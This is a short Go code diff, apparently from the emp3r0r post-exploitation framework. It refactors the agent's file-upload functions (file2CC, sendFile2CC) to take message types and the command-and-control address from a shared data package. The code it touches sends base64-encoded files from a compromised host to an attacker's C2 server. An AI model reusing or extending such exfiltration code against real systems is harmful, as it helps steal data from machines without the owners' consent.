@@ -14,6 +14,7 @@ import (
 
 	"github.com/cavaliercoder/grab"
 	"github.com/google/uuid"
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -36,9 +37,9 @@ func file2CC(filepath string, offset int64) (checksum string, err error) {
 	// base64 encode
 	payload := base64.StdEncoding.EncodeToString(bytes)
 
-	fileData := MsgTunData{
-		Payload: "FILE" + OpSep + filepath + OpSep + payload,
-		Tag:     Tag,
+	fileData := emp3r0r_data.MsgTunData{
+		Payload: "FILE" + emp3r0r_data.OpSep + filepath + emp3r0r_data.OpSep + payload,
+		Tag:     emp3r0r_data.Tag,
 	}
 
 	// send
@@ -128,7 +129,7 @@ func sendFile2CC(filepath string, offset int64, token string) (checksum string, 
 	}
 
 	// connect
-	url := CCAddress + tun.FTPAPI + "/" + token
+	url := emp3r0r_data.CCAddress + tun.FTPAPI + "/" + token
 	conn, ctx, cancel, err := ConnectCC(url)
 	log.Printf("sendFile2CC: connection: %s", url)
 	if err != nil {
